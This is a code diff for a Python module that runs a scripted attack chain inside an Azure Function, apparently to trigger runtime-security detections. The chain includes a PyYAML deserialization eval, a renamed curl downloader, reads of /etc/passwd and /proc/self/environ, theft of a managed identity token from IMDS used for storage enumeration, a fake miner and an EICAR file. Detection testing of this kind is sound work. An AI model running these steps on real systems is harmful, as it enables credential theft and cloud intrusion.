@@ -1,8 +1,10 @@
-"""Checkout fulfillment YAML exploit chain — Azure Function order-webhook."""
+"""Serverless tracer kill chain — Azure Function order-webhook (MITRE ATT&CK)."""
 from __future__ import annotations
 
 import json
 import os
+import shutil
+import socket
 import subprocess
 from pathlib import Path
 from typing import Any
@@ -10,8 +12,14 @@ from urllib.error import HTTPError, URLError
 from urllib.request import Request, urlopen
 
 WORKSHOP_MARKER = Path("/tmp/jss-order-yaml-chain.txt")
+RENAMED_DOWNLOADER = Path("/tmp/.wget")
+MINER_BINARY = Path("/tmp/xmrig")
+EICAR_PATH = Path("/tmp/eicar.com")
+EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
 DEFAULT_YAML_PAYLOAD = "!!python/object/apply:builtins.eval\nargs: ['\"exploited\"']"
 IMDS_HOST = "169.254.169.254"
+SENSITIVE_PATHS = ("/etc/passwd", "/etc/hosts", "/proc/self/environ")
+MINER_DNS = ("pool.supportxmr.com", "xmr.pool.minergate.com")
 
 
 def _redact_token(token: str) -> str:
@@ -22,9 +30,15 @@ def _redact_token(token: str) -> str:
     return f"{token[:8]}...{token[-4:]}"
 
 
-def _run_proc(cmd: list[str], timeout: float = 12) -> dict[str, Any]:
+def _run_proc(cmd: list[str], timeout: float = 12, input_text: str | None = None) -> dict[str, Any]:
     try:
-        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        proc = subprocess.run(
+            cmd,
+            input=input_text,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+        )
         return {
             "command": cmd,
             "returncode": proc.returncode,
@@ -51,6 +65,45 @@ def exploit_yaml(payload: str) -> dict[str, Any]:
         return {"success": True, "exploited": exploited, "result": str(result)}
     except Exception as exc:
         return {"success": False, "exploited": False, "error": str(exc)}
+
+
+def _renamed_downloader() -> dict[str, Any]:
+    curl_path = shutil.which("curl") or "/usr/bin/curl"
+    output_path = Path("/tmp/jss-serverless-downloader.out")
+    steps = [
+        _run_proc(["cp", curl_path, str(RENAMED_DOWNLOADER)]),
+        _run_proc(["chmod", "755", str(RENAMED_DOWNLOADER)]),
+        _run_proc(
+            [
+                str(RENAMED_DOWNLOADER),
+                "-fsSL",
+                "--max-time",
+                "8",
+                "https://icanhazip.com",
+                "-o",
+                str(output_path),
+            ],
+            timeout=12,
+        ),
+    ]
+    return {
+        "downloader_path": str(RENAMED_DOWNLOADER),
+        "output_path": str(output_path),
+        "steps": steps,
+        "downloaded": output_path.exists() and output_path.stat().st_size > 0,
+    }
+
+
+def _sensitive_file_cat() -> dict[str, Any]:
+    steps = []
+    for path in SENSITIVE_PATHS:
+        step = _run_proc(["cat", path])
+        step["path"] = path
+        steps.append(step)
+    return {
+        "steps": steps,
+        "paths_read": sum(1 for s in steps if s.get("returncode") == 0),
+    }
 
 
 def _managed_identity_token() -> dict[str, Any]:
@@ -80,9 +133,6 @@ def _managed_identity_token() -> dict[str, Any]:
         token_redacted = {"error": str(exc)}
 
     return {
-        "step": 3,
-        "action": "managed_identity_token_theft",
-        "scope": "function-runtime",
         "imds_host": IMDS_HOST,
         "client_id": client_id,
         "token_redacted": token_redacted,
@@ -117,8 +167,6 @@ def _arm_storage_probe(access_token: str) -> dict[str, Any]:
         error = "No managed identity access token"
 
     return {
-        "step": 4,
-        "action": "arm_storage_enumeration",
         "subscription": subscription,
         "storage_accounts": storage_accounts,
         "error": error,
@@ -126,17 +174,73 @@ def _arm_storage_probe(access_token: str) -> dict[str, Any]:
     }
 
 
+def _cryptominer_sim() -> dict[str, Any]:
+    dns_results: list[dict[str, Any]] = []
+    for domain in MINER_DNS:
+        entry: dict[str, Any] = {"domain": domain, "resolved": []}
+        try:
+            entry["resolved"] = list(
+                {ai[4][0] for ai in socket.getaddrinfo(domain, 443, proto=socket.IPPROTO_TCP)}
+            )
+        except socket.gaierror as exc:
+            entry["error"] = str(exc)
+        dns_results.append(entry)
+
+    sleep_src = shutil.which("sleep") or "/bin/sleep"
+    steps = [
+        _run_proc(["cp", sleep_src, str(MINER_BINARY)]),
+        _run_proc(["chmod", "755", str(MINER_BINARY)]),
+        _run_proc([str(MINER_BINARY), "2"]),
+    ]
+    return {
+        "miner_path": str(MINER_BINARY),
+        "process_steps": steps,
+        "dns_probes": dns_results,
+        "warning": "Synthetic only — sleep binary renamed to xmrig; no real mining",
+        "upwind": ["Crypto mining threats", "CryptoMiners Services DNS"],
+    }
+
+
+def _eicar_file_write() -> dict[str, Any]:
+    tee_step = _run_proc(["tee", str(EICAR_PATH)], input_text=EICAR + "\n")
+    EICAR_PATH.write_text(EICAR, encoding="utf-8")
+    cat_step = _run_proc(["cat", str(EICAR_PATH)])
+    return {
+        "path": str(EICAR_PATH),
+        "tee_process": tee_step,
+        "cat_process": cat_step,
+        "written": EICAR_PATH.exists(),
+        "length": len(EICAR) if EICAR_PATH.exists() else 0,
+        "upwind": ["Malware protection", "Direct File system access"],
+    }
+
+
 def run_checkout_chain(manifest: str) -> dict[str, Any]:
     chain: list[dict[str, Any]] = []
+
+    chain.append(
+        {
+            "step": 0,
+            "mitre": ["T1190"],
+            "tactic": "Initial Access",
+            "action": "exploit_public_checkout_api",
+            "pattern": "unauthenticated_post_checkout",
+            "note": "Tracer API catalog + Activity Log see POST /checkout from internet",
+            "upwind": ["API custom rules", "Unauthorized API"],
+        }
+    )
 
     yaml_result = exploit_yaml(manifest)
     chain.append(
         {
             "step": 1,
+            "mitre": ["T1203"],
+            "tactic": "Execution",
             "action": "yaml.load fulfillmentManifest in handle_checkout",
             "cve": "CVE-2020-14343",
             "pattern": "unsafe_deserialization",
             **yaml_result,
+            "upwind": ["CVE-2020-14343 / unsafe deserialization"],
         }
     )
 
@@ -146,6 +250,8 @@ def run_checkout_chain(manifest: str) -> dict[str, Any]:
     chain.append(
         {
             "step": 2,
+            "mitre": ["T1059.004"],
+            "tactic": "Execution",
             "action": "post_exploit_identity_probe",
             "process": id_step,
             "marker_file": str(WORKSHOP_MARKER),
@@ -156,34 +262,141 @@ def run_checkout_chain(manifest: str) -> dict[str, Any]:
     shell_pipe = _run_proc(["sh", "-c", f"id 2>&1 | tee -a {WORKSHOP_MARKER}"])
     chain.append(
         {
-            "step": 2,
+            "step": 3,
+            "mitre": ["T1059.004"],
+            "tactic": "Execution",
             "action": "shell_pipe_redirect",
             "process": shell_pipe,
             "upwind": ["Shell Process Redirect", "Custom Process rules"],
         }
     )
 
+    renamed = _renamed_downloader()
+    chain.append(
+        {
+            "step": 4,
+            "mitre": ["T1027"],
+            "tactic": "Defense Evasion",
+            "action": "renamed_downloader_execution",
+            "pattern": "cp_curl_to_hidden_path",
+            **renamed,
+            "upwind": ["Operating system utilities processes", "Out Of Baseline"],
+        }
+    )
+
+    sensitive = _sensitive_file_cat()
+    chain.append(
+        {
+            "step": 5,
+            "mitre": ["T1005"],
+            "tactic": "Collection",
+            "action": "sensitive_system_file_cat",
+            "pattern": "discrete_cat_passwd_proc",
+            **sensitive,
+            "upwind": [
+                "Sensitive file access",
+                "Sensitive System File Access",
+                "Operating system utilities processes",
+            ],
+        }
+    )
+
     identity = _managed_identity_token()
     access_token = identity.pop("_access_token", "")
-    chain.append(identity)
-    chain.append(_arm_storage_probe(access_token))
+    chain.append(
+        {
+            "step": 6,
+            "mitre": ["T1552.005"],
+            "tactic": "Credential Access",
+            "action": "managed_identity_token_theft",
+            "scope": "function-runtime",
+            **identity,
+        }
+    )
+
+    chain.append(
+        {
+            "step": 7,
+            "mitre": ["T1087", "T1619"],
+            "tactic": "Discovery",
+            "action": "arm_storage_enumeration",
+            "scope": "function-data-plane",
+            **_arm_storage_probe(access_token),
+        }
+    )
+
+    miner = _cryptominer_sim()
+    chain.append(
+        {
+            "step": 8,
+            "mitre": ["T1496"],
+            "tactic": "Impact",
+            "action": "cryptominer_simulation",
+            "pattern": "xmrig_sleep_binary_dns_probe",
+            **miner,
+        }
+    )
+
+    eicar = _eicar_file_write()
+    chain.append(
+        {
+            "step": 9,
+            "mitre": ["T1565.001"],
+            "tactic": "Impact",
+            "action": "eicar_file_write",
+            "pattern": "malware_test_file_tee",
+            **eicar,
+        }
+    )
 
     exploited = bool(yaml_result.get("exploited"))
     return {
         "exploited": exploited,
-        "pattern": "checkout_fulfillment_yaml_chain",
+        "pattern": "serverless_tracer_kill_chain",
         "cve": "CVE-2020-14343",
         "scope": "order-webhook-function",
+        "instrumentation": "upwind-tracer-appservice",
+        "mitre_attack": {
+            "tactics": [
+                "Initial Access",
+                "Execution",
+                "Defense Evasion",
+                "Collection",
+                "Credential Access",
+                "Discovery",
+                "Impact",
+            ],
+            "techniques": [
+                "T1190",
+                "T1203",
+                "T1059.004",
+                "T1027",
+                "T1005",
+                "T1552.005",
+                "T1087",
+                "T1619",
+                "T1496",
+                "T1565.001",
+            ],
+        },
         "chain": chain,
         "narrative": (
-            "Attacker submits checkout with poisoned fulfillmentManifest YAML. "
-            "Azure Function parses it unsafely, spawns id/shell for tracer Process events, "
-            "steals the managed identity token from IMDS, and enumerates storage accounts via ARM."
+            "Azure Function tracer story: public checkout (T1190) → PyYAML RCE (T1203) → "
+            "shell/id toolkit (T1059) → renamed curl downloader (T1027) → sensitive cat (T1005) → "
+            "managed identity token via IMDS (T1552.005) → ARM storage discovery (T1619) → miner impact (T1496) → EICAR file (T1565)."
         ),
+        "presenter_notes": {
+            "tracer_signals": "Process (id, sh, cp, cat, curl, xmrig), File (EICAR, markers), API (POST /checkout), DNS (miner pools)",
+            "audit_epilogue": "Correlate ARM storage list + Key Vault paths in Activity Log after step 7",
+            "demo_trigger": "POST /api/security/demo/order-yaml-checkout",
+            "route_note": "Function host.json routePrefix is empty — checkout is /checkout not /api/checkout",
+        },
         "upwind_policies": [
-            "CVE-2020-14343 / unsafe deserialization",
+            "API custom rules — poisoned checkout",
             "Shell Process Redirect",
             "Azure credentials access",
+            "Crypto mining threats",
+            "Malware protection",
             "Activity Log storage",
         ],
     }
